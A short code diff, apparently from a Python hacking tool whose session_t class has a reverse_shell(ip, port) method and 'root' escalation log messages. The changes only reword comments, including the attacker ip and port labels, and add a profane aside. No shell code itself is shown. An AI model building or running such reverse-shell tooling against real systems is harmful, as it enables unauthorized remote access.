@@ -32,6 +32,7 @@ class session_t:
             ("root[ascending..]", (177, 72, 198)),
         ], True)
         
+        # ill get to making this eventually.
         if sys.platform == "linux":
             self.log([
                 (f"{self.name}@session_t:", (205, 205, 205)),
@@ -48,7 +49,7 @@ class session_t:
             ("root[end]", (24, 168, 0)),
         ], True)
 
-    # @ip: str("attacker ipV4") | @port: int("attacker port")
+    # @ip: str("attacking ip") | @port: int("listening port")
     def reverse_shell(self, ip, port):
         self.log([
             (f"{self.name}@{sys.platform}:", (205, 205, 205)),
@@ -91,7 +92,7 @@ class session_t:
     # @data: tuple(text, tuple(color))
     def log(self, data, out):
         _output = ""
-        for i in range(len(data)):
+        for i in range(len(data)): # fuck you and ur enumerate B)
             _output += "\033[38;2;{};{};{}m{} \033[38;2;255;255;255m".format(data[i][1][0], data[i][1][1], data[i][1][2], data[i][0])
 
         if out:
